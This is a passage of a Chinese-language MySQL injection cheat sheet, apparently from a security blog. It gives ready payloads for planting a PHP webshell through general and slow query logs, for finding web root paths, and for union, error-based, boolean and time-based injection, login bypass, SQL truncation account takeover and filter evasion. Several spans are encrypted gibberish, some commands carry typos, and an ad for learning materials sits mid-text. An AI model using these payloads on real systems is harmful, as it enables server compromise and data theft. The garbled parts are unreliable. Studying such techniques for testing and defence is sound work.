
在 MySQL 5.6 版本后，默认为 `NULL`，并且无法用 SQL 语句对其进行修改，所以只能在配置中进行修改。

## 查询参数配置

```sql
show global variables like "%secure%";
```

## 利用 SQL 语句修改配置项

5.6 版本以前可以临时修改，但重启后失效：

```sql
set global secure_file_prive=""
```

5.6 版本以后，只能利用配置项修改：

![](upload/attach/202208/959078_98MSJFR5S2VGDAE.png)

# 日志 GetShell

## 全局日志 GetShell

利用 `general_log`，可以将所有到达 MySQL 服务器的 SQL 语句都记录下来。

### 查看日志是否开启

```sql
show variables like 'general_log';
```

### 开启日志功能

```sql
set global geeral_log=on;
```

### 查看文件日志保存位置

```sql
show variables like 'general_log_file';
```

### 设置日志保存位置

GetShell 的话，存放在网站根目录，名为 `.php`：

```sql
set global general_log_file='/var/www/html/shell.php';
```

### 查看日志输出类型

`table`：将日志存入数据库的日志表中；`file`：将日志存入文件中。

```sql
show variables like 'log_output';
```

### 修改日志存储类型

```sql
set global log_output='table/file';
```

### GetShell 方式

```sql
set global geeral_log=on;

set global general_log_file='/var/www/html/shell.php';

select '<?php eval($_POST[8]);?>'
```

## 慢日志 GetShell

一般都是通过 `long_query_time` 选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为 10 秒），这个查询语句将被记录到慢查询日志中。

### 查看服务器默认时间值

```sql
show global variables like '%long_query_time%'

show global variables like '%long%'
```

### 查看慢日志参数

```sql
show global variable like '%slow%';
```

### GetShell 方式

#### 打开慢日志

```sql
set global slow_query_log=on
```

#### 设置慢日志路径

```sql
set global slow_query_log_file='/var/www/html/shell.php'
```

#### 记录到日志中的语句

```sql
select '<?php @eval($_POST[8]);?>' or sleep(20)
```

# 爆绝对路径的方法

上述的提权方式都离不开知道网站的绝对路径，下面是一些得到绝对路径的方法。

## 单引号爆路径

直接在 URL 后面加单引号，要求单引号没有被过滤（`gpc=off`）且服务器默认返回错误信息。

<mark class="encrypted">a4bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8X3&6W2N6%4y4Q4x3X3g2H3K9s2m8Q4x3@1k6A6k6q4)9K6c8o6q4Q4c8e0u0Q4z5o6m8Q4b7U0t1`.</mark>

## 错误参数值爆路径

将要提交的参数值改成错误值，比如 `-1`。`-99999` 单引号被过滤时不妨试试。

<mark class="encrypted">c1cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8Y4u0W2M7$3g2S2M7X3y4Z5j5i4u0U0K9r3W2$3k6g2)9J5k6i4m8Z5M7q4)9K6c8X3W2V1i4K6y4p5i4K6u0V1x3b7`.`.</mark>

## Google 爆路径

结合关键字和 `site` 语法搜索出错页面的网页快照，常见关键字有 `warning` 和 `fatal error`。注意，如果目标站点是二级域名，`site` 接的是其对应的顶级域名，这样得到的信息要多得多。

```text
Site:xxx.edu.tw warning

Site:xxx.com.tw “fatal error”
```

## 测试文件爆路径

很多网站的根目录下都存在测试文件，脚本代码通常都是 `phpinfo()`。

<mark class="encrypted">1d6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8X3y4W2M7$3S2A6i4K6u0W2M7r3S2H3</mark>

<mark class="encrypted">945K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8X3W2F1k6X3!0Q4x3X3g2H3K9s2l9`.</mark>

<mark class="encrypted">560K9s2c8@1M7q4)9K6b7g2)9J5k6i4S2^5P5q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8Y4m8Z5M7r3W2F1k6X3!0Q4x3X3g2H3K9s2l9`.</mark>

<mark class="encrypted">9cdK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8Y4m8Z5M7q4)9#2k6X3W2F1k6X3!0Q4x3X3g2H3K9s2l9`.</mark>

<mark class="encrypted">08aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6h3y4G2L8g2)9J5c8U0q4Q4x3X3g2H3K9s2l9`.</mark>

## phpMyAdmin 爆路径

一旦找到 phpMyAdmin 的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于 phpMyAdmin 的地址，可以用 `wwwscan` 这类工具去扫，也可以选择 Google。

```text
/phpmyadmin/libraries/lect_lang.lib.php

/phpMyAdmin/index.php?lang[]=1

/phpMyAdmin/phpinfo.php

load_file()

/phpmyadmin/themes/darkblue_orange/layout.inc.php

/phpmyadmin/libraries/select_lang.lib.php

/phpmyadmin/libraries/lect_lang.lib.php

/phpmyadmin/libraries/mcrypt.lib.php
```

## 配置文件找路径

如果注入点有文件读取权限，就可以手工 `load_file` 或使用工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下 Web 服务器和 PHP 的配置文件默认路径可以上网查，这里列举常见的几个。

### Windows

```text
c:\windows\php.ini php 配置文件

c:\windows\system32\inetsrv\MetaBase.xml IIS 虚拟主机配置文件
```

### Linux

```text
/etc/php.ini php 配置文件

/etc/httpd/conf.d/php.conf

/etc/httpd/conf/httpd.conf Apache 配置文件

/usr/local/apache/conf/httpd.conf

/usr/local/apache2/conf/httpd.conf

/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件
```

# Linux

为什么要把 Linux 单独提出来说，因为 Linux 的权限控制很严格，有的时候即使我们完全控制了 MySQL，但是没有对网站根目录的读写权限，也会没有办法去利用上述方法写 shell。

# 基础注入

## 联合查询

若前面的查询结果不为空，则返回两次查询的值。

若前面的查询结果为空，则只返回 `union` 查询的值。

关键字：`union select`

需要字段数对应。

### 常用 Payload

#### 查询表名

```sql
' union select group_concat(table_name) from information_schema.tables where table_schema=database()%23
```

#### 查询字段名

```sql
' union select group_concat(column_name) from information_schema.columns where table_name='table1'%23
```

## 报错注入

报错注入是利用 MySQL 在出错的时候会引出查询信息的特征，常用的报错手段有如下 10 种。

### 修改 `select user()` 字段获取不同的信息

#### 1. `floor()`

```sql
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

#### 2. `extractvalue()`

```sql
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
```

#### 3. `updatexml()`

```sql
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
```

#### 4. `geometrycollection()`

```sql
select * from test where id=1 and geometrycollection((select* from(select * from(select user())a)b));
```

#### 5. `multipoint()`

```sql
select * from test where id=1 and multipoint((select* from(select *from(select user())a)b));
```

#### 6. `polygon()`

```sql
select* from test where id=1 and polygon((select *from(select* from(select user())a)b));
```

#### 7. `multipolygon()`

```sql
select * from test where id=1 and multipolygon((select* from(select *from(select user())a)b));
```

#### 8. `linestring()`

```sql
select* from test where id=1 and linestring((select *from(select* from(select user())a)b));
```

#### 9. `multilinestring()`

```sql
select *from test where id=1 and multilinestring((select* from(select *from(select user())a)b));
```

#### 10. `exp()`

```sql
select* from test where id=1 and exp(~(select * from(select user())a));
```

## 布尔盲注

常见的布尔盲注场景有两种，一是返回值只有 `True` 或 `False` 的类型，二是 `Order by` 盲注。

### 返回值只有 True 或 False 的类型

如果查询结果不为空，则返回 `True`（或者是 `Success` 之类的），否则返回 `False`。

这种注入比较简单，可以挨个猜测表名、字段名和字段值的字符，通过返回结果判断猜测是否正确。

例：

```text
parameter=’ or ascii(substr((select database()) ,1,1))<115—+
```

### Order by 盲注

`order by rand(True)` 和 `order by rand(False)` 的结果排序是不同的，可以根据这个不同来进行盲注。

例：

```sql
order by rand(database()='pdotest')
```

返回了 `True` 的排序，说明 `database()='pdotest'` 是正确的值。

## 时间盲注

其实大多数页面，即使存在 SQL 注入也基本是不会有回显的，因此这时候就要用延时来判断查询的结果是否正确。

常见的时间盲注有：

### 1. `sleep(x)`

```text
id=' or sleep(3)%23

id=' or if(ascii(substr(database(),1,1))>114,sleep(3),0)%23
```

查询结果正确，则延迟 3 秒，错误则无延时。

### 2. `benchmark()`

通过大量运算来模拟延时：

```text
id=' or benchmark(10000000,sha(1))%23

id=' or if(ascii(substr(database(),1,1))>114,benchmark(10000000,sha(1)),0)%23
```

本地测试这个值大约可延时 3 秒。

### 3. 笛卡尔积

计算笛卡尔积也是通过大量运算模拟延时：

```sql
select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C

select balabala from table1 where '1'='2' or if(ascii(substr(database(),1,1))>0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)
```

笛卡尔积延时大约也是 3 秒。

## 网安学习资料

1. 网安学习成长路径思维导图
2. 60+ 网安经典常用工具包
3. 100+ SRC 漏洞分析报告
4. 150+ 网安攻防实战技术电子书
5. 最权威 CISSP 认证考试指南 + 题库
6. 超 1800 页 CTF 实战技巧手册
7. 最新网安大厂面试题合集（含答案）
8. APP 客户端安全检测指南（安卓 + IOS）

# HTTP 头注入

注入手法和上述相差不多，就是注入点发生了变化。

# HTTP 分割注入

常见场景：登录处 SQL 语句如下，其注释符号被过滤：

```sql
select xxx from xxx where username='xxx' and password='xxx'
```

## 方法一

```text
username=1' or extractvalue/ *password=1*/(1,concat(0x7e,(select database()),0x7e))or'
```

SQL 语句最终变为：

```sql
select xxx from xxx where username='1' or extractvalue/*’ and password=’*/(1,concat(0x7e,(select database()),0x7e))or''
```

## 方法二

```text
username=1' or if(ascii(substr(database(),1,1))=115,sleep(3),0) or '1

password=1
```

```sql
select * from users where username='1' or if(ascii(substr(database(),1,1))>0,sleep(3),0) or '1' and password='1'
```

# 二次注入

二次注入主要出现在 `update` 和 `select` 结合点，如注册之后在登录。

攻击者构造的恶意 Payload 首先会被服务器存储在数据库中，在之后取出数据库进行 SQL 语句拼接时产生 SQL 注入问题。

# SQL 约束攻击

假如注册时 `username` 参数在 MySQL 中为字符串类型，并且有 `unique` 属性，设置了长度为 `VARCHAR(20)`。

则我们注册一个 `username` 为 `admin[20个空格]asd` 的用户名，则在 MySQL 中首先会判断是否有重复，若无重复，则会截取前 20 个字符加入到数据库中，所以数据库存储的数据为 `admin[20个空格]`，而进行登录的时候，SQL 语句会忽略空格，因此我们相当于覆写了 `admin` 账号。

# 基础绕过

## 大小写绕过

用于过滤时没有匹配大小写的情况：

```sql
SelECt *from table;
```

## 双写绕过

用于将禁止的字符直接删掉的过滤情况，例如：

```text
preg_replace('/select/','',input)
```

则可用 `seselectlect from xxx` 来绕过，在删除一个 `select` 后剩下的就是 `select from xxx`。

## 绕过空格

当空格被过滤时，可以使用 `/**/`、`()`、`%0a`、`%09` 进行绕过。

## 使用 16 进制绕过特定字符

如果在查询字段名的时候表名被过滤，或是数据库中某些特定字符被过滤，则可用 16 进制绕过。
